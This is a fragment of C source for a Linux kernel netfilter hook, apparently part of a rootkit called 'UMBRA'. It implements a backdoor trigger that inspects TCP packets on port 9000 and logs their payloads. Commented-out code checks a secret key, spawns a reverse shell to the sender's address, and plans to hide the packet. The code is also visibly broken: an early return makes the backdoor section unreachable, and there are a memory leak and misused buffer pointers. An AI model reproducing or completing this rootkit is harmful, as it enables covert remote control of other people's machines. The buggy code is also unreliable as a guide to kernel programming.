static unsigned int my_nf_hookfn(void *priv,
              struct sk_buff *skb,
              const struct nf_hook_state *state)
{
    struct iphdr *iph;
	struct udphdr *udph;
	if (!skb)
		return NF_ACCEPT;

	iph = ip_hdr(skb);
	if (iph->protocol == IPPROTO_UDP) {
		udph = udp_hdr(skb);
		if (ntohs(udph->dest) == 53) {
			return NF_ACCEPT;
		}
	}
	else if (iph->protocol == IPPROTO_TCP) {
		return NF_ACCEPT;
	}
	
	return NF_DROP;




      //Network headers
    struct iphdr *ip_header;        //ip header
    struct tcphdr *tcp_header;      //tcp header
    struct sk_buff *sock_buff = skb;//sock buffer
    char *user_data;       //data header pointer
    //Auxiliar
    int size;                       //payload size
    char* _data;
    struct tcphdr _tcphdr;
    struct iphdr _iph;
    char ip_source[16];
    //char port[16];

    if (!sock_buff){
        return NF_ACCEPT; //socket buffer empty
    }
    
    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
    //ip_header = (struct iphdr *)skb_network_header(sock_buff);
    if (!ip_header){
        return NF_ACCEPT;
    }

    //Backdoor trigger: TCP
    if(ip_header->protocol==IPPROTO_TCP)
    { 
        unsigned int dport;
        unsigned int sport;

        tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcphdr), &_tcphdr);
        //tcp_header= (struct tcphdr*)((unsigned int*)ip_header+ ip_header->ihl);

        sport = htons((unsigned short int) tcp_header->source);
        dport = htons((unsigned short int) tcp_header->dest);
        //printk(KERN_INFO "UMBRA:: Received packet on port %u\n", dport);
        if(dport != 9000)
        {
            return NF_ACCEPT; //We ignore those not for port 9000
        }
        printk(KERN_INFO "UMBRA:: Received packet on port 9000\n");
             

        //size = htons(ip_header->tot_len) - ip_header->ihl*4 - tcp_header->doff*4;
        size = htons(ip_header->tot_len) - sizeof(_iph) - tcp_header->doff*4;
        _data = kmalloc(size, GFP_KERNEL);

        if (!_data)
            return NF_ACCEPT;

        _data = kmalloc(size, GFP_KERNEL);
        user_data = skb_header_pointer(skb, ip_header->ihl*4 + tcp_header->doff*4, size, &_data);
        if(!user_data)
        {
            printk(KERN_INFO "NULL INFO");
            kfree(_data);
            return NF_ACCEPT;
        }

        printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
        printk(KERN_DEBUG "%s\n", user_data);

        if(strlen(user_data)<10){
            return NF_ACCEPT;
        }
        
        // if(memcmp(user_data, UMBRA_BACKDOOR_KEY, strlen(UMBRA_BACKDOOR_KEY))==0){
        //     /****BACKDOOR KEY - Open a shell***/

        //     //Packet had the secret payload.
        //     printk(KERN_INFO "UMBRA:: Received backdoor packet \n");
        //     //kfree(_data);
            
        //     //TODO Use a port specified in malicious packet to spawn shell. Right now always 5888
        //     // snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
        //     /*sprintf(port, "%d", sport);*/
        //     // printk(KERN_INFO "UMBRA:: Shell connecting to %s:%s \n", ip_source, REVERSE_SHELL_PORT);

        //     // start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
        //     //TODO: Hide the backdoor packet to the local system
        //     return NF_DROP;
        // }


        return NF_ACCEPT;

    }
    return NF_ACCEPT;
}

struct nf_hook_ops my_nfho = {
      .hook        = my_nf_hookfn,
      .hooknum     = NF_INET_PRE_ROUTING,
      .pf          = PF_INET,
      .priority    = NF_IP_PRI_FIRST
};
